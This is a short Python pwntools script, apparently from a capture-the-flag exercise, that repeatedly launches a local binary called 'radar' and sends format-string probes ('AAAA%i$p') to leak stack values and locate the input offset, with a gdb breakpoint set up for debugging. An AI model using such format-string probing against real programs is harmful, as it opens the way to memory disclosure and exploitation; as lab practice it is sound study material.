from pwn import *

exe = "./radar"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "warn"
context.terminal = "kitty"

gdbscript = """
init-pwndbg
b *survey+268
continue
""".format(*locals())

for i in range(1, 52):
    io = process()
    io.sendlineafter(b">> ", f"AAAA%{i}$p".encode())
    io.recvuntil(b"--> AAAA")
    data = io.recvline().strip().decode()
    print(f"[{i}] : {data}")
